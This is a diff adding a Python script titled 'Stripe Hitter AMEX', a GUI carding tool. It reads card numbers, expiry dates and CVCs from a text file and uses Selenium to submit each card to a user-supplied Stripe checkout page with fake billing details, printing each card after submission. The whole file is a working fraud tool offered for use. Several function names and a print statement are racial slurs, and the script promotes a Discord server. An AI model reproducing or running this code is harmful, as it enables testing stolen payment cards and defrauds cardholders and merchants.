@@ -1,0 +1,298 @@
+import os
+try:
+    import time
+    from selenium import webdriver
+    from selenium.webdriver.common.keys import Keys
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.wait import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    import customtkinter
+    import tkinter
+    import requests
+    import webbrowser
+    
+except:
+    os.system('pip install selenium')
+    os.system('pip install customtkinter')
+
+CCSFile = open("amex.txt", "r")
+customtkinter.set_appearance_mode("System")
+customtkinter.set_default_color_theme("blue")
+
+app = customtkinter.CTk()
+app.configure(bg="green")
+app.geometry("500x300")
+app.title("Stripe Hitter AMEX")
+
+label = customtkinter.CTkLabel(master=app, text="Stripe Hitter By xKqcper", text_color="red")
+label.place(relx=0.5, rely=0.1, anchor=tkinter.CENTER)
+
+label1 = customtkinter.CTkLabel(master=app, text="Bez Email", text_color="white")
+label1.place(relx=0.16, rely=0.9, anchor=tkinter.CENTER)
+
+label1 = customtkinter.CTkLabel(master=app, text="Sam Adres", text_color="white")
+label1.place(relx=0.5, rely=0.7, anchor=tkinter.CENTER)
+
+label1 = customtkinter.CTkLabel(master=app, text="Email", text_color="white")
+label1.place(relx=0.47, rely=0.9, anchor=tkinter.CENTER)
+
+label1 = customtkinter.CTkLabel(master=app, text="Adres & Email", text_color="white")
+label1.place(relx=0.80, rely=0.9, anchor=tkinter.CENTER)
+
+
+link = customtkinter.CTkEntry(master=app,
+                               placeholder_text="link",
+                               width=120,
+                               height=25,
+                               border_width=2,
+                               corner_radius=10)
+link.place(relx=0.5, rely=0.4, anchor=tkinter.CENTER)
+
+def hitnigga():
+        global CCSFile
+        for cc in CCSFile.readlines():
+            mail1 = 'cardhitter2@gmail.com'
+            link1 = str(link.get())
+            cc = cc.split("|")
+            number = cc[0]
+            name = "xKq ONTOP"
+            expiry_date = cc[1] + cc[2].removeprefix("20")
+            verif_code = cc[3]
+
+            chrome_options = webdriver.ChromeOptions()
+            driver = webdriver.Chrome("chromedriver",chrome_options=chrome_options)
+            
+
+                
+
+            driver.get(link1)
+            driver.maximize_window()
+            original_window = driver.current_window_handle
+            print(original_window)  
+
+            driver.implicitly_wait(9)
+
+            if driver.current_window_handle != original_window:
+                 print("nigga")
+
+            driver.find_element(By.XPATH, '//*[@id="email"]').send_keys(mail1)
+            driver.implicitly_wait(0.1)
+            driver.find_element(By.XPATH, '//*[@id="cardExpiry"]').send_keys(expiry_date)
+            driver.implicitly_wait(0.1)
+            driver.find_element(By.XPATH, '//*[@id="cardCvc"]').send_keys(verif_code)
+            driver.implicitly_wait(0.1)
+            driver.find_element(By.XPATH, '//*[@id="billingName"]').send_keys(name)
+            driver.implicitly_wait(0.1)
+            driver.find_element(By.XPATH, '//*[@id="cardNumber"]').send_keys(number)
+            driver.implicitly_wait(0.1)
+            driver.find_element(By.XPATH, '//*[@id="billingAddressLine1"]').send_keys("xKq")
+            driver.implicitly_wait(0.1) 
+            driver.find_element(By.XPATH, '//*[@id="billingAddressLine2"]').send_keys("xKq")
+            driver.implicitly_wait(0.1)
+            driver.find_element(By.XPATH, '//*[@id="billingLocality"]').send_keys("xKq")
+            driver.implicitly_wait(0.1)
+            driver.find_element(By.XPATH, '//*[@id="billingPostalCode"]').send_keys("1")
+            driver.implicitly_wait(0.1)
+            driver.find_element(By.XPATH, '//*[@id="root"]/div/div/div[2]/div/div[2]/form/div[2]/div/div[2]/button').click()
+            print(number + "|" + expiry_date + "|" + verif_code)
+            time.sleep(13)
+
+def czarnuch():
+    CCSFile = open("amex.txt", "r")
+    for cc in CCSFile.readlines():
+        mail1 = 'cardhitter2@gmail.com'
+        link1 = str(link.get())
+        cc = cc.split("|")
+        number = cc[0]
+        name = "xKq ONTOP"
+        expiry_date = cc[1] + cc[2].removeprefix("20")
+        verif_code = cc[3]
+
+        chrome_options = webdriver.ChromeOptions()
+        driver = webdriver.Chrome("chromedriver",chrome_options=chrome_options)
+
+        driver.get(link1)
+
+
+        original_window = driver.current_window_handle
+        print(original_window)  
+
+        driver.implicitly_wait(2)
+
+        for window_handle in driver.window_handles:
+                if window_handle != original_window:
+                    driver.switch_to.window(window_handle)
+                    print(original_window)
+                    print(window_handle)
+                    break
+
+        driver.find_element(By.XPATH, '//*[@id="cardNumber"]').send_keys(number)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="cardExpiry"]').send_keys(expiry_date)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="cardCvc"]').send_keys(verif_code)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="billingName"]').send_keys(name)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="root"]/div/div/div[2]/div/div[2]/form/div[2]/div/div[2]/button').click()
+        print(number + "|" + expiry_date + "|" + verif_code)
+        time.sleep(16)
+
+def kacperek():
+    CCSFile = open("amex.txt", "r")
+    for cc in CCSFile.readlines():
+        mail1 = 'cardhitter2@gmail.com'
+        link1 = str(link.get())
+        cc = cc.split("|")
+        number = cc[0]
+        name = "xKq ONTOP"
+        expiry_date = cc[1] + cc[2].removeprefix("20")
+        verif_code = cc[3]
+
+        chrome_options = webdriver.ChromeOptions()
+        driver = webdriver.Chrome("chromedriver",chrome_options=chrome_options)
+
+        driver.get(link1)
+
+
+        original_window = driver.current_window_handle
+        print(original_window)  
+
+        driver.implicitly_wait(2)
+
+        for window_handle in driver.window_handles:
+                if window_handle != original_window:
+                    driver.switch_to.window(window_handle)
+                    print(original_window)
+                    print(window_handle)
+                    break
+
+        driver.find_element(By.XPATH, '//*[@id="cardNumber"]').send_keys(number)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="cardExpiry"]').send_keys(expiry_date)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="cardCvc"]').send_keys(verif_code)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="billingName"]').send_keys(name)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="billingAddressLine1"]').send_keys("xKq")
+        driver.implicitly_wait(0.1) 
+        driver.find_element(By.XPATH, '//*[@id="billingAddressLine2"]').send_keys("xKq")
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="billingLocality"]').send_keys("xKq")
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="billingPostalCode"]').send_keys("1")
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="root"]/div/div/div[2]/div/div[2]/form/div[2]/div/div[2]/button').click()
+        print(number + "|" + expiry_date + "|" + verif_code)
+        time.sleep(13)
+
+def niggur():
+    CCSFile = open("amex.txt", "r")
+    for cc in CCSFile.readlines():
+        mail1 = 'cardhitter2@gmail.com'
+        link1 = str(link.get())
+        cc = cc.split("|")
+        number = cc[0]
+        name = "xKq ONTOP"
+        expiry_date = cc[1] + cc[2].removeprefix("20")
+        verif_code = cc[3]
+
+        chrome_options = webdriver.ChromeOptions()
+        driver = webdriver.Chrome("chromedriver",chrome_options=chrome_options)
+            
+
+        driver.get(link1)
+
+        original_window = driver.current_window_handle
+        print(original_window)  
+
+        driver.implicitly_wait(2)
+
+        for window_handle in driver.window_handles:
+                if window_handle != original_window:
+                    driver.switch_to.window(window_handle)
+                    print(original_window)
+                    print(window_handle)
+                    break
+
+        
+        driver.find_element(By.XPATH, '//*[@id="email"]').send_keys(mail1)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="cardExpiry"]').send_keys(expiry_date)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="cardCvc"]').send_keys(verif_code)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="billingName"]').send_keys(name)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="cardNumber"]').send_keys(number)
+        driver.implicitly_wait(0.1)
+        driver.find_element(By.XPATH, '//*[@id="root"]/div/div/div[2]/div/div[2]/form/div[2]/div/div[2]/button').click()
+        print(number + "|" + expiry_date + "|" + verif_code)
+        time.sleep(12)
+
+def discord(): 
+    webbrowser.open('https://discord.gg/XEU7KHND6w')
+
+
+button = customtkinter.CTkButton(master=app,
+                                 width=120,
+                                 height=32,
+                                 border_width=0,
+                                 corner_radius=8,
+                                 fg_color="Red",
+                                 hover_color="#092fed",
+                                 text="xKq",
+                                 command=czarnuch)
+
+button.place(relx=0.2, rely=0.8, anchor=tkinter.CENTER)
+
+button = customtkinter.CTkButton(master=app,
+                                 width=120,
+                                 height=32,
+                                 border_width=0,
+                                 corner_radius=8,
+                                 fg_color="Red",
+                                 hover_color="#092fed",
+                                 text="ON",
+                                 command=niggur)
+
+button.place(relx=0.5, rely=0.8, anchor=tkinter.CENTER)
+
+button = customtkinter.CTkButton(master=app,
+                                 width=120,
+                                 height=32,
+                                 border_width=0,
+                                 corner_radius=8,
+                                 fg_color="Red",
+                                 hover_color="#092fed",
+                                 text="TOP",
+                                 command=hitnigga)
+
+button.place(relx=0.8, rely=0.8, anchor=tkinter.CENTER)
+
+button = customtkinter.CTkButton(master=app,
+                                 width=120,
+                                 height=32,
+                                 border_width=0,
+                                 corner_radius=8,
+                                 fg_color="Red",
+                                 hover_color="#092fed",
+                                 text="xKqcper",
+                                 command=kacperek)
+
+button.place(relx=0.5, rely=0.6, anchor=tkinter.CENTER)
+
+button = customtkinter.CTkButton(master=app,
+                                 width=120,
+                                 height=32,
+                                 border_width=0,
+                                 corner_radius=8,
+                                 fg_color="Red",
+                                 hover_color="#092fed",
+                                 text="My Discord",
+                                 command=discord)
+
+button.place(relx=0.8, rely=0.1, anchor=tkinter.CENTER)
+
+app.mainloop()
